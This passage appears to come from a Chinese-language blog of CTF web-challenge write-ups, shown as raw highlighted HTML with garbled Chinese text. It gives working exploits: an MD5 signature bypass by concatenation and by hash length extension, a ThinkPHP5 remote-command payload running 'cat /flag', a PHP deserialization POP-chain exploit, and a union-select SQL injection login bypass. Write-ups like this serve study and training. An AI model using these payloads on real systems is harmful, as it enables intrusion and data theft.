class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>        <span class=\"hljs-keyword\">else</span>:<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-comment\">#generate Sign For Action Scan.</span><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&quot;/geneSign&quot;</span>, methods=[<span class=\"hljs-string\">&#x27;GET&#x27;</span>, <span class=\"hljs-string\">&#x27;POST&#x27;</span>]</span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class=\"hljs-string\">&quot;param&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>))<br>    action = <span class=\"hljs-string\">&quot;scan&quot;</span><br>    <span class=\"hljs-keyword\">return</span> getSign(action, param)<br><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/De1ta&#x27;</span>,methods=[<span class=\"hljs-string\">&#x27;GET&#x27;</span>,<span class=\"hljs-string\">&#x27;POST&#x27;</span>]</span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class=\"hljs-string\">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class=\"hljs-string\">&quot;param&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class=\"hljs-string\">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class=\"hljs-keyword\">if</span>(waf(param)):<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class=\"hljs-keyword\">return</span> json.dumps(task.Exec())<br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">index</span>():</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;code.txt&quot;</span>,<span class=\"hljs-string\">&quot;r&quot;</span>).read()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">scan</span>(<span class=\"hljs-params\">param</span>):</span><br>    socket.setdefaulttimeout(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-keyword\">try</span>:<br>        <span class=\"hljs-keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"hljs-number\">50</span>]<br>    <span class=\"hljs-keyword\">except</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;Connection Timeout&quot;</span><br><br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">getSign</span>(<span class=\"hljs-params\">action, param</span>):</span><br>    <span class=\"hljs-keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">md5</span>(<span class=\"hljs-params\">content</span>):</span><br>    <span class=\"hljs-keyword\">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">waf</span>(<span class=\"hljs-params\">param</span>):</span><br>    check=param.strip().lower()<br>    <span class=\"hljs-keyword\">if</span> check.startswith(<span class=\"hljs-string\">&quot;gopher&quot;</span>) <span class=\"hljs-keyword\">or</span> check.startswith(<span class=\"hljs-string\">&quot;file&quot;</span>):<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class=\"hljs-literal\">False</span><br>    app.run(host=<span class=\"hljs-string\">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure></li>\n<li><p>å¯ä»¥çœ‹åˆ°å¯¹æ–‡ä»¶æ‰§è¡Œæ“ä½œçš„æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªscanï¼Œä¸€ä¸ªreadï¼ŒscanæŠŠæ–‡ä»¶å†™é“resault.txtï¼Œè€Œreadå¯ä»¥è¯»æ–‡ä»¶ã€‚</p>\n</li>\n<li><p>ä½†æ˜¯è¦å®ç°è¯»å†™æ–‡ä»¶å°±è¦çªç ´hashçš„éªŒè¯ã€‚è¿™é‡Œä¸»è¦æœ‰ä¸¤ä¸ªæ–¹æ³•æ¥çªç ´éªŒè¯ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡æœ¬èº«çš„ä»£ç æ¥ç»•è¿‡ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯é€šè¿‡hashpumpyå·¥å…·æ¥ç»•è¿‡</p>\n<ol>\n<li>é€šè¿‡æœ¬èº«ä»£ç ç»•è¿‡ï¼š<ol>\n<li>å› ä¸ºåˆ¤æ–­æ˜¯scanè¿˜æ˜¯readæ“ä½œç”¨çš„æ˜¯<code>in</code>è€Œä¸æ˜¯<code>=</code>,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥scanreadå®ç°åŒæ—¶æ“ä½œ</li>\n<li>å“ˆå¸Œåˆ¤æ–­ï¼š<code>md5(secert_key+param+action)</code>,secert_keyæ˜¯å›ºå®šçš„ï¼Œparamå’Œactionå¯æ§ï¼Œè€Œ<code>/geneSign</code>å¯ä»¥æ‹¿åˆ°åŠ å¯†åçš„hashå€¼ï¼Œå½“æˆ‘ä»¬ä¼ å…¥param=flag.txtreadæ—¶ï¼Œç­‰å¼å·¦è¾¹ç­‰äº<code>md5(secert_key+&#39;flag.txtread&#39;+&#39;scan&#39;)</code>,ç„¶åæˆ‘ä»¬è®¿é—®<code>/De1ta</code>æ—¶param=flag.txt&amp;action=readscan,æ­¤æ—¶ä¸¤ä¸ªmd5å€¼ç›¸ç­‰ä¹Ÿå°±ç»•è¿‡äº†éªŒè¯ï¼ŒæŠŠç¬¬ä¸€æ­¥å¾—åˆ°çš„hashä¼ å…¥ç¬¬äºŒéƒ¨å³å¯æ‹¿åˆ°flag</li>\n</ol>\n</li>\n<li>åˆ©ç”¨å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»hashpumpyå·¥å…·ç»•è¿‡<ol>\n<li><code>hashpumpy.hashpump(&#39;a36a5ba0e8b9bb78094cbdb641007508&#39;, &#39;scan&#39;, &#39;read&#39;, 24)</code>=&gt;<code>(&#39;ca08c49a467b1e8b465aa6acb96f20f1&#39;, &#39;scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read&#39;)</code></li>\n<li>ä¼ å…¥param=flag.txtï¼Œaction=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00readï¼Œsing=ca08c49a467b1e8b465aa6acb96f20f1å³å¯æ‹¿åˆ°flag</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"BJDCTF-2nd-old-hack\"><a href=\"#BJDCTF-2nd-old-hack\" class=\"headerlink\" title=\"[BJDCTF 2nd]old-hack\"></a>[BJDCTF 2nd]old-hack</h2><ol>\n<li><p>æ‰“å¼€ç½‘ç«™æç¤ºTHINKPHP5</p>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/nongchaoer/p/12029478.html\">https://www.cnblogs.com/nongchaoer/p/12029478.html</a></p>\n</li>\n<li><p>æµ‹è¯•payloadï¼š</p>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs oxygene\">POST ?s=xxx<br><br><br>_method=__construct&amp;filter[]=system&amp;<span class=\"hljs-function\"><span class=\"hljs-keyword\">method</span>=<span class=\"hljs-title\">get</span>&amp;<span class=\"hljs-title\">server</span>[<span class=\"hljs-title\">REQUEST_METHOD</span>]=<span class=\"hljs-title\">cat</span> /<span class=\"hljs-title\">flag</span></span><br></code></pre></td></tr></table></figure>\n\n<p>æ‹¿åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz\"><a href=\"#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz\" class=\"headerlink\" title=\"[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz\"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><ol>\n<li><p>æºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br><br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$op</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$filename</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$content</span>;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;write();<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read();<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-variable\">$res</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;content)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-keyword\">$this</span>-&gt;content) &gt; <span class=\"hljs-number\">100</span>) &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Too long!&quot;</span>);<br>                <span class=\"hljs-keyword\">die</span>();<br>            &#125;<br>            <span class=\"hljs-variable\">$res</span> = file_put_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename, <span class=\"hljs-keyword\">$this</span>-&gt;content);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$res</span>) <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Successful!&quot;</span>);<br>            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename)) &#123;<br>            <span class=\"hljs-variable\">$res</span> = file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$res</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">output</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$s</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>            <span class=\"hljs-keyword\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_valid</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; strlen(<span class=\"hljs-variable\">$s</span>); <span class=\"hljs-variable\">$i</span>++)<br>        <span class=\"hljs-keyword\">if</span>(!(ord(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &gt;= <span class=\"hljs-number\">32</span> &amp;&amp; ord(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &lt;= <span class=\"hljs-number\">125</span>))<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>&#123;<span class=\"hljs-string\">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class=\"hljs-variable\">$str</span> = (<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;str&#x27;</span>];<br>    <span class=\"hljs-keyword\">if</span>(is_valid(<span class=\"hljs-variable\">$str</span>)) &#123;<br>        <span class=\"hljs-variable\">$obj</span> = unserialize(<span class=\"hljs-variable\">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œå¯»æ‰¾POPé“¾</p>\n</li>\n<li><p>read()å¯ä»¥è¯»æ–‡ä»¶=&gt;read()ä¼šè¢«process()è°ƒç”¨=&gt;process()ä¼šè¢«<code>__construct()</code>è¿˜æœ‰<code>__destruct()</code>è°ƒç”¨</p>\n</li>\n<li><p>ç”±äº<code>__construct()</code>ä¼šåˆå§‹åŒ–å¯¼è‡´æ–‡ä»¶åä¸å¯æ§ï¼Œä¸”å…¶å¯ä»¥ç»•è¿‡ï¼Œè€Œ<code>__destruct()</code>,ä¼šè®©opå¼ºåˆ¶ç­‰äº1ï¼Œä½†æ˜¯è¿™é‡Œç”¨äº†<code>===â€˜2â€™</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœopä¸ºæ•´å‹2ï¼Œå³å¯ç»•è¿‡</p>\n</li>\n<li><p>åŒæ—¶è¿™é¢˜æœ‰ä¸€ä¸ªcheckï¼Œæˆ‘ä»¬æŠŠprotectedæ”¹æˆpublicå³å¯ç»•è¿‡</p>\n</li>\n<li><p>expï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$op</span>=<span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$filename</span>=<span class=\"hljs-string\">&#x27;flag.php&#x27;</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$content</span>;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;write();<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read();<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-variable\">$res</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;content)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-keyword\">$this</span>-&gt;content) &gt; <span class=\"hljs-number\">100</span>) &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Too long!&quot;</span>);<br>                <span class=\"hljs-keyword\">die</span>();<br>            &#125;<br>            <span class=\"hljs-variable\">$res</span> = file_put_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename, <span class=\"hljs-keyword\">$this</span>-&gt;content);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$res</span>) <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Successful!&quot;</span>);<br>            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename)) &#123;<br>            <span class=\"hljs-variable\">$res</span> = file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$res</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">output</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$s</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>            <span class=\"hljs-keyword\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> FileHandler;<br>var_dump(urlencode(serialize(<span class=\"hljs-variable\">$a</span>)));<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"GXYCTF2019-BabySQli\"><a href=\"#GXYCTF2019-BabySQli\" class=\"headerlink\" title=\"[GXYCTF2019]BabySQli\"></a>[GXYCTF2019]BabySQli</h2><ol>\n<li>æµ‹è¯•å•å¼•å·ä¼šæŠ¥é”™</li>\n<li>union select å­—æ®µæ•°ä¸º3ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ç‚¹ï¼Œå¯èƒ½æ˜¯ç›²æ³¨æˆ–è€…æŠ¥é”™æ³¨å…¥</li>\n<li>userä¸ºadminæ—¶æŠ¥wrong passï¼Œuserä¸ºå…¶å®ƒæ—¶æŠ¥wrong userï¼Œè¿™é‡Œå¯èƒ½æ˜¯ç›²æ³¨ç‚¹</li>\n<li> æœ‰ä¸€æ®µç¼–ç ï¼Œbase32+base64è§£ç å¾—åˆ°ï¼š<code>select * from user where username = &#39;$name&#39;</code></li>\n<li>é¢˜ç›®è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼š<code>(    )   or    =</code></li>\n<li>è¦é€šè¿‡æ³¨å…¥æ‹¿åˆ°æ•°æ®åŸºæœ¬æ˜¯ä¸å¯è¡Œçš„ï¼Œè¿™é‡Œçœ‹åˆ°sqlè¯­å¥ä¸­åªæœ‰æŸ¥è¯¢nameå€¼ï¼Œæ²¡æœ‰çœ‹åˆ°passwordï¼Œå¯èƒ½åˆ¤æ–­æ˜¯å¦ç™»å…¥çš„è¯­å¥æ˜¯<code>(select * from user where username = &#39;$name&#39;)[&#39;password&#39;] =md5(password) </code></li>\n<li>æ­¤æ—¶æ„é€ payload:<code>name=-1&#39; union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code>å³å¯ç™»é™†æˆåŠŸæ‹¿åˆ°flag</li>\n</ol>\n<h2 